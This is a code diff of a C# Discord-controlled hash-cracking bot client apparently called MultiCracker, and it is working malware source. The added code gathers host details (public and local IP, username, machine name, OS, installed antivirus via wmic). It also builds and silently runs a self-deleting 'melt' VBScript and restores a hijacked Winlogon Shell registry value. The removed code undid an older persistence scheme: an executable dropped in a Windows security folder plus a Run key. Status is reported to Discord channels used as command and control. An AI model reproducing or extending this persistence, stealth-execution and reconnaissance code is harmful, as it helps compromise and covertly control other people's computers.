+                            // Log and inform about the error if deletion fails
+                            Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding file {dllFile} from {targetDirectory} to VBScript: {ex.Message}"));
+                            await channel.SendMessageAsync($"Error adding file {dllFile} from {targetDirectory} to VBScript: {ex.Message}");
+                        }
+                    }
+                    foreach (string pdbFile in pdbFiles)
+                    {
+                        try
+                        {
+                            // Add code to vbs file to delete the .dll file
+                            uninstallVbsContent += $"objFSO.DeleteFile \"{pdbFile}\"\r\n";
+                        }
+                        catch (Exception ex)
+                        {
+                            // Log and inform about the error if deletion fails
+                            Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding file {pdbFile} from {targetDirectory} to VBScript: {ex.Message}"));
+                            await channel.SendMessageAsync($"Error adding file {pdbFile} from {targetDirectory} to VBScript: {ex.Message}");
+                        }
+                    }
+                    foreach (string jsonFile in jsonFiles)
+                    {
+                        try
+                        {
+                            // Add code to vbs file to delete the .dll file
+                            uninstallVbsContent += $"objFSO.DeleteFile \"{jsonFile}\"\r\n";
+                        }
+                        catch (Exception ex)
+                        {
+                            // Log and inform about the error if deletion fails
+                            Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding file {jsonFile} from {targetDirectory} to VBScript: {ex.Message}"));
+                            await channel.SendMessageAsync($"Error adding file {jsonFile} from {targetDirectory} to VBScript: {ex.Message}");
+                        }
+                    }
+
+                    // Check if the executable is in the target directory
+                    if (System.IO.File.Exists(exePath))
+                    {
+                        try
+                        {
+                            // Add code to vbs file to delete the .dll file
+                            uninstallVbsContent += $"objFSO.DeleteFile \"{Path.GetFullPath(exePath)}\"\r\n";
+                        }
+                        catch (Exception ex)
+                        {
+                            // Log and inform about the error if deletion fails
+                            Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding file {exePath} from {targetDirectory} to VBScript: {ex.Message}"));
+                            await channel.SendMessageAsync($"Error adding file {exePath} from {targetDirectory} to VBScript: {ex.Message}");
+                        }
+                    }
+                    else
+                    {
+                        // Log and inform if the executable is not found in the target directory
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"EXE file is not installed. (Not found in {targetDirectory})"));
+                        await channel.SendMessageAsync($"EXE file is not installed. (Not found in {targetDirectory})");
+                    }
+
+                    // Replace the registry key with the original value (explorer.exe)
+                    try
+                    {
+                        RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
+                        if (key != null)
+                        {
+                            key.SetValue("Shell", "explorer.exe");
+                            // Log and inform about the successful registry modification
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Restored registry part. (explorer.exe)"));
+                            await channel.SendMessageAsync($"Restored registry part. (explorer.exe)");
+                        }
+                        else
+                        {
+                            // Log and inform if unable to access the registry key
+                            Log(new LogMessage(LogSeverity.Error, "Persistence", $"Unable to access registry key."));
+                            await channel.SendMessageAsync($"Unable to access registry key.");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log and inform about the error if registry modification fails
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error restoring registry key: {ex.Message}"));
+                        await channel.SendMessageAsync($"Error restoring registry key: {ex.Message}");
+                    }
+
+                    // Creation and execution of the uninstall.vbs file
+                    try
+                    {
+                        // Add melt part to the uninstall.vbs file
+                        uninstallVbsContent += $"objFSO.DeleteFile WScript.ScriptFullName\r\n";
+
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Creating uninstall persistence VBScript payload..."));
+                        System.IO.File.WriteAllText(uninstallVbsPath, uninstallVbsContent);
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstall persistence VBScript payload created."));
+
+                        // Execute the uninstall.vbs file
+                        ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", $"/C cscript /E:vbscript \"{uninstallVbsPath}\"");
+                        processInfo.CreateNoWindow = true;
+                        processInfo.UseShellExecute = false;
+                        processInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                        Process process = new Process();
+                        process.StartInfo = processInfo;
+                        process.Start();
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Client executed uninstall script."));
+                        await channel.SendMessageAsync($"Client executed uninstall script. Goodbye!");
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log and inform about the error if the uninstall.vbs file creation fails
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error creating uninstall persistence VBScript payload: {ex.Message}"));
+                        await channel.SendMessageAsync($"Error creating uninstall persistence VBScript payload: {ex.Message}");
+                    }
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Target directory not found."));
+                    // Send discord message
+                    await channel.SendMessageAsync($"Error uninstalling persistence. Target directory not found.");
+                }
+
+
             }
             else
             {
-                // Log
-                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling special persistence..."));
-
-                // Set important variables
-                string exePath = Application.ExecutablePath;
-                string exeName = Path.GetFileName(exePath);
-                string newExePath = Path.Combine(@"C:\windows\security\database", $"{fileNameSpecial}");
-                string targetDirectory = @"C:\windows\security\database";
-
-                // Check if the executable is in droppoint
-                if (System.IO.File.Exists(newExePath))
-                {
-                    // Delete the executable
-                    try
-                    {
-                        System.IO.File.Delete(newExePath);
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {newExePath}"));
-                    }
-                    catch (Exception ex)
-                    {
-                        // Log
-                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting {newExePath}: {ex.Message}"));
-                        channel.SendMessageAsync($"Error deleting {newExePath}: {ex.Message}");
-                    }
-                }
-                else
-                {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed."));
-                    channel.SendMessageAsync($"Exe persistence is not installed. (Path to EXE: {newExePath})");
-                }
-
-                // Check for registry key
-                RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                string[] subKeys = keyCheck.GetValueNames();
-                bool regeditPersistenceInstalled = false;
-
-                foreach (string subKey in subKeys)
-                {
-                    if (subKey == registryName)
-                    {
-                        regeditPersistenceInstalled = true;
-                    }
-                }
-
-                if (regeditPersistenceInstalled)
-                {
-                    // Delete registry key
-                    try
-                    {
-                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        key.DeleteValue(registryName);
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
-                        channel.SendMessageAsync("Removed registry key!");
-                    }
-                    catch (Exception ex)
-                    {
-                        // Log
-                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
-                        channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
-                    }
-                }
-                else
-                {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed."));
-                    channel.SendMessageAsync($"Regedit persistence is not installed. (Keyname: {registryName})");
-                }
-
-                // Check if both are installed
-                if (regeditPersistenceInstalled || System.IO.File.Exists(newExePath))
-                {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
-                    channel.SendMessageAsync("Persistence is installed.");
-                }
-                else
-                {
-                    // Log
-                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
-                    channel.SendMessageAsync("Persistence is not installed.");
-                }
+                // Log and inform if the channel is not found
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
             }
         }
 
@@ -3923,6 +4102,89 @@ namespace MultiCracker
         }
 
 
+        // Gather information
+        public string GetInformation()
+        {
+            // Get public IP address
+            string publicIp = GetPublicIP().GetAwaiter().GetResult();
+            // Get local IP address
+            string localIp = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
+            // Get Username
+            string username = Environment.UserName;
+            // Get Computername
+            string computername = Environment.MachineName;
+            // Get OS
+            string os = Environment.OSVersion.ToString();
+            // Get Architecture
+            string architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86";
+            // Get AV
+            string av = GetAV();
+            // Get Uptime
+            string uptime = GetUptime();
+
+            // Add all of them toghether
+            string allCombined = $"Public IP: {publicIp}\nLocal IP: {localIp}\nUsername: {username}\nComputername: {computername}\nOS: {os}\nArchitecture: {architecture}\nAV: {av}\nUptime: {uptime}";
+            return allCombined;
+        }
+
+        // Get public IP
+        public async Task<string> GetPublicIP()
+        {
+            string publicIP = "N/A";
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Make GET request to the service
+                    HttpResponseMessage response = await client.GetAsync("https://icanhazip.com/");
+
+                    // Check if the response is successful
+                    if (response.IsSuccessStatusCode)
+                    {
+                        // Read the content (public IP address)
+                        publicIP = await response.Content.ReadAsStringAsync();
+                        // Trim any whitespace characters (such as newline characters)
+                        publicIP = publicIP.Trim();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // Log or handle any exceptions
+                Console.WriteLine("An error occurred while getting public IP: " + ex.Message);
+            }
+            return publicIP;
+        }
+
+        // Get AV
+        public string GetAV()
+        {
+            // Execute a cmd command
+            string av = ExecuteCommand("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list");
+
+            // Check if av is null or empty
+            if (string.IsNullOrEmpty(av))
+            {
+                av = "N/A";
+            }
+            else
+            {
+                // Remove the "displayName=" from displayName=Windows Defender
+                av = av.Replace("displayName=", "").Trim();
+            }
+
+            return av;
+        }
+
+        // Get uptime
+        public string GetUptime()
+        {
+            TimeSpan uptimeSpan = TimeSpan.FromMilliseconds(Environment.TickCount);
+            string uptime = uptimeSpan.ToString(@"dd\.hh\:mm\:ss");
+            return uptime;
+        }
+
+
 
         // Forces argument
         public string SearchForArguments(string targetHash)
@@ -3930,7 +4192,7 @@ namespace MultiCracker
             // Find Channel "hash" in the same guild and look through all messages
             var guildHash = _client.Guilds.FirstOrDefault(); // Get the first available guild
             var channelHash = guildHash.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
-            
+
             // Get the last 100 messages
             var messagesHash = channelHash.GetMessagesAsync(100).FlattenAsync().Result;
             List<IMessage> messageListHash = messagesHash.ToList();
@@ -4080,7 +4342,7 @@ namespace MultiCracker
                         Log(new LogMessage(LogSeverity.Error, "Forces", $"Error sending points: {ex.Message}"));
                     }
 
-                    
+
                 }
 
             }
@@ -4237,7 +4499,7 @@ namespace MultiCracker
             // Find channel "settings" in the same guild and look through all messages
             var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
             var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"settings");
-            if ( channel != null )
+            if (channel != null)
             {
                 // Get the last message
                 var messages = channel.GetMessagesAsync(1).FlattenAsync().Result;
@@ -4280,7 +4542,7 @@ namespace MultiCracker
 
             }
         }
-        
+
         // Find and select auto split
         public void findAndSelectAutoSplit()
         {
@@ -4343,7 +4605,7 @@ namespace MultiCracker
                             // Log an error or handle the situation where the format is incorrect
                             Log(new LogMessage(LogSeverity.Error, "Auto", $"Invalid format in cluster: {cluster}"));
                         }
-                        
+
                     }
 
                     // Log
@@ -4432,7 +4694,8 @@ namespace MultiCracker
         }
         async void SendHeartbeat(int level)
         {
-            if (level == 1) {
+            if (level == 1)
+            {
                 // Log (typically around 30 sec without answer)
                 Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 1"));
             }
@@ -4819,7 +5082,7 @@ namespace MultiCracker
             string status = "";
             try
             {
-                status += $"**------------------ Settings ------------------**\r\n"; 
+                status += $"**------------------ Settings ------------------**\r\n";
                 status += $"Password found: **{FoundCorrectPass}** \r\n";
                 if (Algorithm != null)
                     status += $"Algorithm: **{Algorithm}** \r\n";
@@ -4854,7 +5117,7 @@ namespace MultiCracker
                 status += $"\r\n**------------------ Time ------------------**\r\n";
                 if (timeStarted != null)
                     status += $"Time started: **{timeStarted}** \r\n";
-                else 
+                else
                     status += $"Time started: **NULL** \r\n";
                 if (timeStopped != null)
                     status += $"Time stopped: **{timeStopped}** (Estimated...)\r\n";
@@ -4867,16 +5130,16 @@ namespace MultiCracker
                     status += $"Hashes per second: **NULL**\r\n";
                 if (formattedTimeElapsed != null)
                     status += $"Time elapsed: **{formattedTimeElapsed}** \r\n";
-                else 
+                else
                     status += $"Time elapsed: **NULL** \r\n";
                 if (formattedTimeRemaining != null)
                     status += $"Estimated time remaining: **{formattedTimeRemaining}** \r\n";
-                else 
+                else
                     status += $"Estimated time remaining: **NULL** \r\n";
                 status += $"\r\n**------------------ Misc ------------------**\r\n";
                 if (forcesSS != null)
                     status += $"ForcesSS: **{forcesSS}** \r\n";
-                else 
+                else
                     status += $"ForcesSS: **NULL** \r\n";
             }
             catch (Exception ex)
@@ -4904,7 +5167,7 @@ namespace MultiCracker
 
             // Calculate days, hours, minutes, seconds, and milliseconds
             BigInteger totalSeconds = (BigInteger)estimatedTimeRemaining;
-            
+
             BigInteger days = totalSeconds / (24 * 3600);
             BigInteger remainingSeconds = totalSeconds % (24 * 3600);
             BigInteger hours = remainingSeconds / 3600;
@@ -5099,7 +5362,7 @@ namespace MultiCracker
 
                 // Check if the counter is inside of a point, such as 0,100;500,600;800,1000
                 bool insideRange = false;
-                
+
                 // Convert forcesSS to forceRanges
                 List<(int, int)> forceRanges = new List<(int, int)>();
                 string[] forceRangesRaw = forcesSS.Split(";");
@@ -5156,7 +5419,7 @@ namespace MultiCracker
                     // Log how much time it took
                     TimeSpan time = TimeSpan.FromMilliseconds(stopwatch.Elapsed.TotalSeconds);
                     Log(new LogMessage(LogSeverity.Info, "Cracking", "It only took " + time.ToString(@"hh\:mm\:ss\:fff") + " to find the password!"));
-                    
+
                     if (AutoCrack)
                     {
                         // IMPLEMENT: Somehow stop all auto-splitting bots
